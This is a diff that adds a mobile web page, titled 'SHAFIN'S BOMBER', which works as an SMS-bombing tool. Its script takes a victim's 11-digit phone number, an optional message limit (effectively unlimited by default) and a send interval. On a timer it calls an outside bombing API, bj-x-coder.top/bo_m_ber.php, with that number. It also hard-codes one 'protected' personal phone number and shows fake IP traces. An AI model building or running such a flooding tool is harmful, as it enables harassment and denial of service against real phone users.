@@ -1,0 +1,443 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>SHAFIN'S BOOMBING COUNTER V3.16.7 MOBILE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #00ff41;
+      --alert: #ff3333;
+      --bg: #050505;
+      --panel: rgba(0, 20, 0, 0.90);
+    }
+
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--primary);
+      font-family: "Share Tech Mono", monospace;
+      height: 100vh;
+      overflow: hidden; /* Prevent body scroll, handle inside interface */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Matrix Background */
+    canvas#matrix {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: -1;
+      opacity: 0.25;
+    }
+
+    /* Main Interface */
+    .interface {
+      width: 100%;
+      max-width: 900px;
+      height: 100%;
+      max-height: 100vh;
+      background: var(--panel);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow-y: auto; /* Allow scrolling inside if needed */
+    }
+
+    /* Header */
+    .header {
+      padding: 15px;
+      border-bottom: 1px solid var(--primary);
+      background: rgba(0, 50, 0, 0.5);
+      flex-shrink: 0;
+      text-align: center;
+    }
+    .title-typewriter {
+      font-size: 20px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      text-shadow: 0 0 5px var(--primary);
+      margin-bottom: 5px;
+    }
+    .status { font-size: 10px; color: var(--alert); animation: blink 1s infinite; }
+
+    /* Content Area */
+    .content-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column; /* Mobile First: Column */
+      padding: 15px;
+      gap: 15px;
+    }
+
+    /* Desktop View adjustments */
+    @media (min-width: 768px) {
+      .interface {
+        height: 85vh;
+        width: 95%;
+        border: 1px solid var(--primary);
+        box-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
+        border-radius: 4px;
+      }
+      .content-area {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        overflow: hidden;
+      }
+      .visuals { order: 2; height: 100%; }
+      .controls { order: 1; }
+    }
+
+    /* Visuals (Radar) */
+    .visuals {
+      background: #000500;
+      border: 1px solid #003300;
+      position: relative;
+      height: 180px; /* Mobile height */
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    
+    canvas#radar { position: absolute; }
+
+    .geo-data {
+      position: absolute;
+      bottom: 5px; left: 5px;
+      font-size: 10px;
+      color: #00aa00;
+      background: rgba(0,0,0,0.5);
+      padding: 2px;
+    }
+
+    /* Controls */
+    .controls {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    
+    .input-box { position: relative; }
+    
+    label { font-size: 11px; color: #88ff88; margin-bottom: 4px; display: block; }
+    
+    input {
+      width: 100%;
+      background: #001100;
+      border: 1px solid #005500;
+      color: var(--primary);
+      padding: 15px; /* Larger touch area */
+      font-family: inherit;
+      font-size: 16px; /* Prevents iOS zoom on focus */
+      outline: none;
+      border-radius: 0;
+      -webkit-appearance: none;
+    }
+    input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
+
+    .btn-group { display: flex; gap: 10px; margin-top: 5px; }
+    
+    button {
+      flex: 1;
+      padding: 18px; /* Fat finger friendly */
+      font-family: inherit;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      text-transform: uppercase;
+      border: none;
+      transition: 0.2s;
+    }
+
+    .btn-start { 
+      background: var(--primary); 
+      color: #000; 
+      clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+    }
+    .btn-start:active { transform: scale(0.98); }
+    .btn-start:disabled { background: #333; color: #666; }
+
+    .btn-stop { 
+      background: rgba(50,0,0,0.3); 
+      border: 1px solid var(--alert); 
+      color: var(--alert); 
+    }
+    .btn-stop:active { background: var(--alert); color: #000; }
+
+    /* Terminal/Footer */
+    .terminal {
+      height: 150px;
+      background: #000;
+      border-top: 1px solid var(--primary);
+      padding: 10px;
+      overflow-y: auto;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+    .log-entry { margin: 2px 0; padding-left: 5px; border-left: 2px solid #333; word-wrap: break-word; }
+    .log-sent { border-color: var(--primary); color: #ccffcc; }
+    .log-err { border-color: var(--alert); color: var(--alert); }
+    .log-sys { border-color: #ffff00; color: #ffff00; }
+
+    @keyframes blink { 50% { opacity: 0; } }
+  </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="interface">
+  <div class="header">
+    <div class="title-typewriter" id="typewriter"></div>
+    <div class="status">● NETWORK: SECURE (MOBILE)</div>
+  </div>
+
+  <div class="content-area">
+    
+    <div class="visuals">
+      <canvas id="radar" width="300" height="300"></canvas>
+      <div class="geo-data" id="geo-info">
+        SCANNING AREA...
+      </div>
+    </div>
+
+    <div class="controls">
+      <div class="input-box">
+        <label>/// TARGET MSISDN (11 DIGITS)</label>
+        <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="017XXXXXXXX" maxlength="11" />
+      </div>
+
+      <div class="input-box">
+        <label>/// PACKET LIMIT (OPTIONAL)</label>
+        <input id="amount" type="number" inputmode="numeric" pattern="[0-9]*" placeholder="Default: Unlimited" />
+      </div>
+
+      <div class="input-box">
+        <label>/// THREAD SPEED (MS)</label>
+        <input id="speed" type="number" inputmode="numeric" value="1500" placeholder="1000 = 1 Second" />
+      </div>
+
+      <div class="btn-group">
+        <button id="startBtn" class="btn-start">ATTACK</button>
+        <button id="stopBtn" class="btn-stop">STOP</button>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="terminal" id="console">
+    <div class="log-entry log-sys">> MOBILE SHELL V3.1 LOADED.</div>
+  </div>
+</div>
+
+<script>
+// --- CONFIG ---
+let isRunning = false;
+let attackTimer = null;
+let packetsSent = 0;
+let packetLimit = 0;
+
+const phoneEl = document.getElementById('phone');
+const amountEl = document.getElementById('amount');
+const speedEl = document.getElementById('speed');
+const consoleEl = document.getElementById('console');
+const startBtn = document.getElementById('startBtn');
+const geoInfo = document.getElementById('geo-info');
+const typewriterEl = document.getElementById('typewriter');
+
+// --- INIT ---
+window.onload = () => {
+  const savedPhone = localStorage.getItem('shafin_target');
+  if(savedPhone) {
+    phoneEl.value = savedPhone;
+    log(`Restored Target: ${savedPhone}`, 'sys');
+  }
+  startTypewriter("SHAFIN'S BOMBER V3.16.7");
+  resizeMatrix();
+};
+
+window.onresize = resizeMatrix;
+
+// --- TYPEWRITER ---
+function startTypewriter(text, i = 0) {
+  if (i < text.length) {
+    typewriterEl.innerHTML += text.charAt(i);
+    setTimeout(() => startTypewriter(text, i + 1), 80);
+  }
+}
+
+// --- LOGGER ---
+function log(msg, type = 'sent') {
+  const div = document.createElement('div');
+  const time = new Date().toLocaleTimeString('en-US', {hour12:false});
+  div.className = `log-entry log-${type}`;
+  div.innerText = `[${time}] ${msg}`;
+  consoleEl.appendChild(div);
+  consoleEl.scrollTop = consoleEl.scrollHeight;
+}
+
+// --- CORE LOGIC ---
+startBtn.onclick = () => {
+  let phone = phoneEl.value.replace(/[^0-9]/g, '');
+  const speed = parseInt(speedEl.value) || 1500;
+  packetLimit = parseInt(amountEl.value) || 99999; 
+  
+  // PROTECTED NUMBERS (Retained your logic)
+  const protectedNumbers = ["01317087493"]; 
+
+  if (protectedNumbers.includes(phone)) {
+    log('ACCESS DENIED: PROTECTED NUMBER', 'err');
+    navigator.vibrate([200, 100, 200]); // Vibrate phone on error
+    alert("SYSTEM WARNING: Protected by SHAFIN Protocol.");
+    return;
+  }
+
+  if(phone.length < 11) {
+    log('ERROR: Invalid Number', 'err');
+    navigator.vibrate(200);
+    return;
+  }
+
+  localStorage.setItem('shafin_target', phone);
+
+  isRunning = true;
+  packetsSent = 0;
+  
+  startBtn.disabled = true;
+  startBtn.innerText = "RUNNING...";
+  log(`TARGET LOCKED: ${phone}`, 'sys');
+
+  // Loop
+  attackTimer = setInterval(() => {
+    if(!isRunning) return;
+    
+    if(packetsSent >= packetLimit) {
+      stopAttack("Limit Reached");
+      return;
+    }
+
+    sendPacket(phone);
+    updateFakeTrace();
+
+  }, speed);
+};
+
+document.getElementById('stopBtn').onclick = () => stopAttack("Aborted");
+
+function stopAttack(reason) {
+  isRunning = false;
+  clearInterval(attackTimer);
+  startBtn.disabled = false;
+  startBtn.innerText = "ATTACK";
+  log(`STOPPED: ${reason}`, 'err');
+  navigator.vibrate(500); // Vibrate on stop
+}
+
+async function sendPacket(phone) {
+  // Using the API
+  const url = `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=1`;
+  try {
+    fetch(url, { mode: 'no-cors' }); 
+    packetsSent++;
+    log(`>> Packet sent to ${phone} (${packetsSent})`);
+  } catch (e) {
+    log(`Fail: ${e.message}`, 'err');
+  }
+}
+
+// --- RADAR VISUALS ---
+function updateFakeTrace() {
+  const ip = `103.20.${Math.floor(Math.random()*99)}.${Math.floor(Math.random()*255)}`;
+  geoInfo.innerHTML = `IP: ${ip} <br> LOCATING...`;
+}
+
+const rCanvas = document.getElementById('radar');
+const rCtx = rCanvas.getContext('2d');
+let angle = 0;
+
+function drawRadar() {
+  rCtx.clearRect(0,0,300,300);
+  
+  // Center
+  const cx = 150, cy = 150;
+
+  // Grid Rings
+  rCtx.strokeStyle = 'rgba(0, 50, 0, 0.8)';
+  rCtx.lineWidth = 1;
+  rCtx.beginPath();
+  rCtx.arc(cx, cy, 50, 0, Math.PI*2);
+  rCtx.arc(cx, cy, 90, 0, Math.PI*2);
+  rCtx.arc(cx, cy, 130, 0, Math.PI*2);
+  rCtx.stroke();
+  
+  // Crosshair
+  rCtx.beginPath();
+  rCtx.moveTo(cx, cy-140); rCtx.lineTo(cx, cy+140);
+  rCtx.moveTo(cx-140, cy); rCtx.lineTo(cx+140, cy);
+  rCtx.stroke();
+
+  // Sweep
+  rCtx.save();
+  rCtx.translate(cx, cy);
+  rCtx.rotate(angle);
+  
+  const grad = rCtx.createLinearGradient(0, 0, 130, 0);
+  grad.addColorStop(0, 'rgba(0, 255, 65, 0)');
+  grad.addColorStop(1, 'rgba(0, 255, 65, 0.4)');
+  
+  rCtx.fillStyle = grad;
+  rCtx.beginPath();
+  rCtx.moveTo(0,0);
+  rCtx.arc(0, 0, 130, 0, 0.4); 
+  rCtx.fill();
+  rCtx.restore();
+
+  // Red Dots
+  if(Math.random() > 0.90) {
+    const x = cx + (Math.random() - 0.5) * 200;
+    const y = cy + (Math.random() - 0.5) * 200;
+    rCtx.fillStyle = '#ff3333';
+    rCtx.fillRect(x, y, 4, 4);
+  }
+
+  angle += 0.04;
+  requestAnimationFrame(drawRadar);
+}
+drawRadar();
+
+// --- MATRIX BG RESIZE FIX ---
+const mC = document.getElementById("matrix");
+const mCtx = mC.getContext("2d");
+let chars = "10"; 
+let drops = [];
+
+function resizeMatrix() {
+  mC.height = window.innerHeight; 
+  mC.width = window.innerWidth;
+  drops = Array(Math.floor(mC.width/14)).fill(1);
+}
+
+setInterval(()=>{
+  mCtx.fillStyle="rgba(0,0,0,0.1)"; 
+  mCtx.fillRect(0,0,mC.width,mC.height);
+  mCtx.fillStyle="#003300"; // Darker green for background subtlety
+  mCtx.font = "14px monospace";
+  
+  drops.forEach((y,i)=>{
+    mCtx.fillText(chars[Math.floor(Math.random()*2)], i*14, y*14);
+    if(y*14 > mC.height && Math.random()>0.95) drops[i]=0;
+    drops[i]++;
+  });
+}, 50);
+
+</script>
+</body>
+</html>
